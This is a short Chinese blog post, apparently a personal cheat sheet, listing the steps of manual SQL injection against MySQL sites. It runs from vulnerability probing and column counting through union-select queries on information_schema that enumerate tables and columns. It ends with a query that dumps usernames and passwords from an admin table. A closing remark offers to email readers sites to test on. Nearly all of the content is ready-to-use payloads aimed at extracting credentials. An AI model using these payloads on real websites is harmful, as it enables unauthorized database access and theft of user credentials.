---
title: Sql手工注入过程
tags: [Sql注入]
categories: [网络安全]
date: 2016-04-14 12:01:25
---

<blockquote class="blockquote-center">
记录以下手工注入的过程, 一些常用的语句, 以免自己忘记, 数据库版本是mysql5以上
</blockquote>
             
## 1. 网站脆弱性检测

    ' / and 1=1 / and 1=2 等。

## 2. 拆解字段数目

    order by (N)

## 3. 查看渗透相关信息
   
    database() : 站点所用数据库
    user() : 站点当前数据库用户
    version() : 数据库版本信息
    @@version_compile_os : 站点所在服务器操作系统版本         

    union select database()
    union select user()
    ...

<!-- more -->

## 4. 联合查询表名 (以下均以 N=2 示例)

    union select 1,group_concat(table_name) from information_schema.tables where table_schema=(编码后的数据库名, 或者单引号括起来) 

## 5. 联合查询字段名

    union select 1,group_concat(column_name) from information_schema.columns where table_name=(编码后的数据库表名, 或者单引号括起来)

## 6. 联合查询数据

    union select (username), (password) from (admin_table)

    () 中为可变的字段, 名字不一定叫做 username 和 password



PS: 想要网站测试的童鞋留下邮箱我会把测试网站发给你们哟 :P

